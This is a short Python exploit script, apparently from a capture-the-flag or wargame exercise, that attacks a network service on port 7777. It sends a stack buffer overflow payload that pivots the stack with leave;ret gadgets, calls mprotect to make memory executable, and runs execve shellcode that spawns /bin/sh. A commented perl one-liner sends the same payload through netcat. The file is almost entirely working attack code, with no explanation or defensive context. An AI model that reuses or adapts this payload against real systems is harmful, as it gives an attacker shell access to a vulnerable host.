import os, struct
from socket import *

def L(num):
	return struct.pack('<L', num)


#victim = "nc localhost 7777"


leave_ret = 0x8048561
fake_sfp = 0xf6ffe16c
mprotect = 0x00714670
btween_stdin = 0xf6ffe1b0
stdin = 0xf6ffe000
arg1 = 0x800
arg2 = 0x7
shellcode = "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
sock = socket(AF_INET, SOCK_STREAM);
sock.connect("192.168.1.20", 7777);

payload = "A"*268
payload += L(leave_ret)
payload += "B"*88
payload += L(fake_sfp)
payload += L(leave_ret)
payload += L(mprotect)
payload += L(btween_stdin)
payload += L(stdin)
payload += L(arg1)
payload += L(arg2)
payload += "\x90"*500
payload += shellcode
sock.send(payload)
sock.recv(1024)

#(perl -e 'print "\xbf"x268, "\x61\x85\x04\x08", "\x90"x88, "\x6c\xe1\xff\xf6", "\x61\x85\x04\x08", "\x70\x46\x71\x00", "\xb0\xe1\xff\xf6", "\x00\xe0\xff\xf6", "\x00\x08\x00\x00", "\x07\x00\x00\x00", "\x90"x500, "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"';cat)|nc localhost 7777
